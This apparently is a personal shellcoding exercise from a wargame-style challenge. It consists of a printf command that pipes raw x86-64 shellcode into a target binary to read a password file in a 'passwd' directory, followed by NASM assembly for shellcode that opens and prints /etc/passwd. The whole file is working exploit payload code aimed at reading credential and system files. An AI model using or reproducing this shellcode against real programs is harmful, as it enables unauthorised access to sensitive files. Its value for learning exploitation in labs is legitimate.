; printf "\x48\x31\xff\xbe\x00\x10\x00\x00\xba\x07\x00\x00\x00\x41\xba\x22\x00\x00\x00\x4d\x31\xc0\x49\xff\xc8\x4d\x31\xc9\xb8\x09\x00\x00\x00\x0f\x05\x48\x89\xf2\x48\x89\xc6\x48\x31\xc0\x0f\x05\xff\xd6\x90\x90\xeb\x59\x5f\xbe\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x49\x89\xc2\x48\x83\xec\x08\x4c\x89\xd7\x48\x89\xe6\xba\x01\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x48\xff\xc1\x48\x83\xf8\x00\x7e\x1a\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xeb\xc7\x48\x83\xc4\x08\xbf\x00\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05\xe8\xa2\xff\xff\xff\x70\x61\x73\x73\x77\x64\x2f\x2e\x70\x61\x73\x73\x77\x64\x5f\x56\x43\x41\x50\x5a\x79\x66\x65\x59\x72\x59\x67\x4d\x76\x53\x61\x32\x35\x4d\x76\x38\x67\x42\x31\x42\x73\x33\x77\x6a\x4d\x76\x70" | ../../prog/64-shellcoding/a.out

section .text
global _start

_start:
	jmp pre_filename

post_filename:
	; int open(const char *pathname, int flags, mode_t mode);
	pop rdi
	mov rsi, 0	; r
	mov rax, 2	; open
	syscall

	mov r10, rax

read:
	sub rsp, 8
	; ssize_t read(int fd, void *buf, size_t count);
	mov rdi, r10 	; fd
	mov rsi, rsp	; buf
	mov rdx, 1	; count
	mov rax, 0 	; read
	syscall

	inc rcx ;	 ???

	cmp rax, 0
	jle exit

	; ssize_t write(int fd, const void *buf, size_t count);
	mov rdi, 1
	mov rsi, rsp
	mov rdx, 1
	mov rax, 1
	syscall

	add rsp, 8
	jmp read

exit:
	add rsp, 8

	mov rdi, 0
	mov rax, 60
	syscall

pre_filename:
	call post_filename
	db "/etc/passwd", 0
